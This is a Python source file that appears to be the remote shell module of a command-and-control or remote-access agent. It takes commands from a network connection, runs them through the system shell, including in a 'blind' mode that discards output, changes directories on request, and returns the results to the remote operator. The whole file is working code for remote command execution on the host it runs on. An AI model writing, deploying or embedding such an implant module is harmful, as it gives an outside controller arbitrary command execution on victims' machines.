import os
import subprocess


class ModuleSource:
    def __init__(self):
        pass

    def run_module(self, command, args, connection):
        def path_replace_envvar(filepath):
            path = os.path.normpath(filepath)
            split_path = path.split(os.sep)
            for component_index, component in enumerate(split_path):
                if component.startswith("%") and component.endswith("%"):
                    env_var = component[1:-1]
                    if env_var in os.environ:
                        split_path[component_index] = os.environ[env_var]
                elif component.startswith('"%') and component.endswith('%"'):
                    split_path[component_index] = component[1:-1]
            return os.sep.join(split_path)

        if args["interactive"] == "INIT_INTERACTIVE":
            connection.send_string(os.getcwd())
        else:
            if args["execute"].startswith("cd "):
                if args["env_parse"]:
                    new_dir = path_replace_envvar(args["execute"][3:]).strip()
                else:
                    new_dir = args["execute"][3:].strip()

                try:
                    os.chdir(new_dir)
                    connection.send_json(
                        {
                            "message": f"[+] Changed directory into : {new_dir}",
                            "current_dir": os.getcwd(),
                        },
                    )
                except OSError as e:
                    connection.send_json(
                        {
                            "message": f'[-] Could not change directory into "{new_dir}". Error : {e}',
                            "current_dir": os.getcwd(),
                        },
                    )
            else:
                try:
                    if not args["blind"]:
                        result = subprocess.run(
                            args["execute"],
                            capture_output=True,
                            timeout=args["timeout"],
                            shell=True,
                        )
                        result = result.stdout + result.stderr
                    else:
                        subprocess.run(
                            args["execute"],
                            timeout=args["timeout"],
                            shell=True,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                        )
                except subprocess.TimeoutExpired:
                    result = f'[-] Command "{args["execute"]}" timed out on timeout duration : {args["timeout"]}'.encode()

                if not args["blind"]:
                    connection.send_json(
                        {"message": result.decode(), "current_dir": os.getcwd()},
                    )
                else:
                    connection.send_json(
                        {
                            "message": f"[*] Blindly ran : {args['execute']}",
                            "current_dir": os.getcwd(),
                        },
                    )
